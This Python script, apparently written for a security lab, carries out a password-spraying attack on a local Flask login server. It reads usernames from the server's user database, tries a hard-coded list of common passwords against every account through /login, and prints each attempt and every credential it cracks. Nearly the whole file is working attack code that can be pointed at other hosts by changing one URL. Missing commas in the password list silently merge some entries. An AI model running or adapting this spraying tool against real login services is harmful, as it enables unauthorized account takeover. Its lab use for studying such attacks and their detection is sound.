"""
attack_password_spraying.py

Password Spraying attack script.

This noudle simulates a realistic password spraying attack
the Flask login server(server.py).
Unlike brute force on a single account, password spraying tries a small
set of very common passwords across many useres.

Key ideas:
- Usernames are loaded from the same users DB file the server uses.
  (USERS_DB_FILE), as if an attacker got hold of that file (leak/misconfig).
- COMMON_PASSWORDS contains a list of very common passwords.
- The script stops once it reaches MAX_ATTEMPTS or finished the list of passwords to check.

During the run, every login attempt is sent to /login and the server writes
its own JSONL logs (attempts.log). This script itself prints a textual log
of each attempt, and at the end prints all credetials that were successfully
cracked (username, password).
"""
import requests
import json

MAX_ATTEMPTS = 50000
from config import USERS_DB_FILE  # Attacker learns usernames from DB
# Target server base URL
BASE_URL = "http://127.0.0.1:5000"
# File that stores the user DB (same as server)
USERS_FILE = USERS_DB_FILE
# Smaill dictionary of common passwords used for password spraying.
# Each entry will be tested against all usersnames.

COMMON_PASSWORDS = [
    "password", "AB12", "ABC12", "ABC123", "ABCD123", "ABCD1234","shadow","admin123"
    "12345", "123456", "1234567", "12345678","welcome","iloveyou","iloveu","admin12"
    "admin", "Admin", "pass", "123456", "12345678", "1234", "qwerty","football","admin1"
    "12345678", "11111111", "ABCDEFGH", "abcdefgh","passport","11111111","password1",
    "0000", "00000", "000000", "0000000", "ABCDEFG","qwerty123","p@ssword","qwertyuiop",
    "adminstrator","test","t@es","global123","p@ass123","Admin123","abcd1234","ginger","maggie",
    "jessica","jennifer","amanda","Robert","daniel","william","maria","veronica","susana",
    "minecraft","Minecraft","fortnite","guest","passw0rd","password!","qwerty!","computer","yankees"
]


def load_usernames():
    """
    Load all users from users DB file (USERS_FILE).

    The idea is to simulate an attacker who has obtained the users_db.json
    and extract all existing accounts to target.

    Behavior:
    - Opens USER_FILE.
    - Parses JSON into a dictinoary.
    - Filters out internal meta-data keys that start with "_"
      so only real usernames remain.

    :return: List of usernames( strings) to attack.
    """
    with open(USERS_FILE, "r") as f:
        data = json.load(f)
    usernames = [name for name in data.keys() if not name.startswith("_")]
    return usernames


def try_login(username: str, password: str):
    """
    Send a single login attempt to the /login endpoint.

    Bulids a JSON payload with the given username and password, sends
    a Post request to BASE_URL/login, and tries to parse the JSON response.

    If the server response is not valid JSON, the function wraps the raw
    text under the "raw" key.

    :param username: Username to test.
    :param password: Password candidate to text for this user.
    :return: Tuple (status_code, data) where:
        - status_code: HTTP status code returned by the server.
        - data: Parsed JSON dict if possible, otherwise {"raw": "<text>"}.

    """
    url = f"{BASE_URL}/login"
    payload = {
        "username": username,
        "password": password
    }
    resp = requests.post(url, json=payload)
    try:
        data = resp.json()
    except Exception:
        data = {"raw": resp.text}
    return resp.status_code, data


def main():
    """
    Run a full password-spraying attack against all known users.

    Workflow:
    1. Load all usernames from USERS_FILE using load_usernames(), simulating
       an attacker who has access to the user DB.
    2. Print a header with:
       - Number of usenames loaded.
       - Number of common passwords in COMMON_PASSWORDS.
       - Global MAX_ATTEMPTS limit.
    3. For each password in COMMON_PASSWORDS:
       - for each username in the list:
         a. Increase the global attempt counter.
         b. If attempt_count > MAX_ATTEMPTS:
            - Stop the attack
            - Print total attempts and all successes found so far.
            - Return to main().
         c. Call try_login(username, pwd) and print a detailed log line.
         d. If status == 200 (HTTP OK):
            - Treat this as a seccessful login.
            - Print a SUCCESS line.
            - Append (username, password) to the founs list.
            - Continue scanning other usernames/passwords.
    4. After all loops finish:
        - Print  a final summary with total attempts and a list of all cracked credentials.

    :return:
    """
    usernames = load_usernames()
    print(f"[+] Loaded {len(usernames)} users from {USERS_FILE}")
    print(f"[+] Starting password spraying with {len(COMMON_PASSWORDS)} common passwords")
    print(f"[+] Total max attempts allowed: {MAX_ATTEMPTS}")

    attempt_count = 0
    found = []

    for pwd in COMMON_PASSWORDS:
        for username in usernames:
            attempt_count += 1
            if attempt_count > MAX_ATTEMPTS:
                print("[!] Reached MAX_ATTEMPTS limit, stopping.")
                print(f"[!] Total attempts: {attempt_count - 1}")
                print(f"[+] Successes so far: {found}")
                return
            status, data = try_login(username, pwd)
            print(f"[*] Attempt {attempt_count:5d}: user={username:15s} password = {pwd!r} -> {status}, {data}")

            if status == 200:
                print(f"[+] SUCCESS! user={username} password={pwd!r}")
                found.append((username, pwd))

    print()
    print("[+] password spraying finished.")
    print(f"[+] Total attempts:{attempt_count}")
    print(f"[+] Found credentials :{found}")


if __name__ == "__main__":
    main()
